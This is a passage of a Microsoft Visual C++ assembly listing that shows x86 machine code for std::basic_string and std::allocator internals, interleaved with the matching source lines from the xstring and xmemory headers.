  0002c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax
$LN2@Myptr:

; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  0002f	8b 45 f8	 mov	 eax, DWORD PTR __Result$[ebp]

; 2232 :     }

  00032	8b e5		 mov	 esp, ebp
  00034	5d		 pop	 ebp
  00035	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAEPA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT
; _this$ = ecx

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	c7 40 10 00 00
	00 00		 mov	 DWORD PTR [eax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	c7 41 14 00 00
	00 00		 mov	 DWORD PTR [ecx+20], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  00023	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@ABV32@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Al$ = 12						; size = 4
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@ABV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction, COMDAT

; 744  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 745  :         return _Al;

  00003	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 746  :     }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@ABV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAIABV?$allocator@_W@2@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 4
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAIABV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  00003	b8 ff ff ff 7f	 mov	 eax, 2147483647		; 7fffffffH

; 742  :     }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAIABV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QAEPA_WI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Count$ = 8						; size = 4
?allocate@?$allocator@_W@std@@QAEPA_WI@Z PROC		; std::allocator<wchar_t>::allocate, COMDAT
; _this$ = ecx

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00007	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$01@std@@YAII@Z ; std::_Get_size_of_n<2>
  00010	83 c4 04	 add	 esp, 4
  00013	50		 push	 eax
  00014	e8 00 00 00 00	 call	 ??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z ; std::_Allocate<8,std::_Default_allocate_traits,0>
  00019	83 c4 04	 add	 esp, 4

; 983  :     }

  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c2 04 00	 ret	 4
?allocate@?$allocator@_W@std@@QAEPA_WI@Z ENDP		; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QAEXQA_WI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
?deallocate@?$allocator@_W@std@@QAEXQA_WI@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT
; _this$ = ecx

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00007	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0000a	d1 e0		 shl	 eax, 1
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00010	51		 push	 ecx
  00011	e8 00 00 00 00	 call	 ??$_Deallocate@$07$0A@@std@@YAXPAXI@Z ; std::_Deallocate<8,0>
  00016	83 c4 08	 add	 esp, 8

; 978  :     }

  00019	8b e5		 mov	 esp, ebp
  0001b	5d		 pop	 ebp
  0001c	c2 08 00	 ret	 8
?deallocate@?$allocator@_W@std@@QAEXQA_WI@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$allocator@_W@std@@QAE@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT
; _this$ = ecx

; 966  :     constexpr allocator() noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
??0?$allocator@_W@std@@QAE@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::~_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QBEABV?$allocator@D@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QBEABV?$allocator@D@2@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first, COMDAT
; _this$ = ecx

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1535 :         return *this;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1536 :     }

  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QBEABV?$allocator@D@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAEAAV?$allocator@D@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAEAAV?$allocator@D@2@XZ PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first, COMDAT
; _this$ = ecx

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1531 :         return *this;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1532 :     }

  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAEAAV?$allocator@D@2@XZ ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal, COMDAT
; _this$ = ecx

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4894 :         return _Mypair._Get_first();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QBEABV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first

; 4895 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEABV?$allocator@D@2@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal, COMDAT
; _this$ = ecx

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4890 :         return _Mypair._Get_first();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAEAAV?$allocator@D@2@XZ ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Get_first

; 4891 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z
_TEXT	SEGMENT
tv79 = -8						; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators, COMDAT
; _this$ = ecx

; 4885 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(basic_string& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4886 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv79[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f8	 mov	 ecx, DWORD PTR tv79[ebp]
  00016	e8 00 00 00 00	 call	 ?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators

; 4887 :     }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ
_TEXT	SEGMENT
__Al$1 = -16						; size = 4
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
$T2 = -1						; size = 1
?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate, COMDAT
; _this$ = ecx

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 4864 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 4865 :         _My_data._Orphan_all();

  0000f	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00017	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0001a	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
  0001f	0f b6 c8	 movzx	 ecx, al
  00022	85 c9		 test	 ecx, ecx
  00024	74 2c		 je	 SHORT $LN2@Tidy_deall

; 4867 :             _ASAN_STRING_REMOVE(*this);
; 4868 :             auto& _Al = _Getal();

  00026	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00029	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  0002e	89 45 f0	 mov	 DWORD PTR __Al$1[ebp], eax

; 4869 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

  00031	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00034	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00037	50		 push	 eax
  00038	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0003b	8b 11		 mov	 edx, DWORD PTR [ecx]
  0003d	52		 push	 edx
  0003e	8b 45 f0	 mov	 eax, DWORD PTR __Al$1[ebp]
  00041	50		 push	 eax
  00042	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
  00047	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4870 :             _My_data._Bx._Switch_to_buf();

  0004a	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0004d	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Switch_to_buf
$LN2@Tidy_deall:

; 4871 :         }
; 4872 : 
; 4873 :         _My_data._Mysize = 0;

  00052	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00055	c7 41 10 00 00
	00 00		 mov	 DWORD PTR [ecx+16], 0

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  0005c	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  0005f	c7 42 14 0f 00
	00 00		 mov	 DWORD PTR [edx+20], 15	; 0000000fH

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00066	c6 45 ff 00	 mov	 BYTE PTR $T2[ebp], 0
  0006a	8d 45 ff	 lea	 eax, DWORD PTR $T2[ebp]
  0006d	50		 push	 eax
  0006e	b9 01 00 00 00	 mov	 ecx, 1
  00073	6b d1 00	 imul	 edx, ecx, 0
  00076	03 55 f8	 add	 edx, DWORD PTR __My_data$[ebp]
  00079	52		 push	 edx
  0007a	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0007f	83 c4 08	 add	 esp, 8

; 4877 :     }

  00082	8b e5		 mov	 esp, ebp
  00084	5d		 pop	 ebp
  00085	c3		 ret	 0
?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXI@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_size$ = 8						; size = 4
?_Eos@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Eos, COMDAT
; _this$ = ecx

; 4857 :     _CONSTEXPR20 void _Eos(const size_type _New_size) noexcept { // set new length and null terminator

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4858 :         _ASAN_STRING_MODIFY(*this, _Mypair._Myval2._Mysize, _New_size);
; 4859 :         _Mypair._Myval2._Mysize = _New_size;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 4d 08	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0000f	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4860 :         _Traits::assign(_Mypair._Myval2._Myptr()[_New_size], _Elem());

  00012	c6 45 ff 00	 mov	 BYTE PTR $T1[ebp], 0
  00016	8d 55 ff	 lea	 edx, DWORD PTR $T1[ebp]
  00019	52		 push	 edx
  0001a	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001d	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
  00022	03 45 08	 add	 eax, DWORD PTR __New_size$[ebp]
  00025	50		 push	 eax
  00026	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0002b	83 c4 08	 add	 esp, 8

; 4861 :     }

  0002e	8b e5		 mov	 esp, ebp
  00030	5d		 pop	 ebp
  00031	c2 04 00	 ret	 4
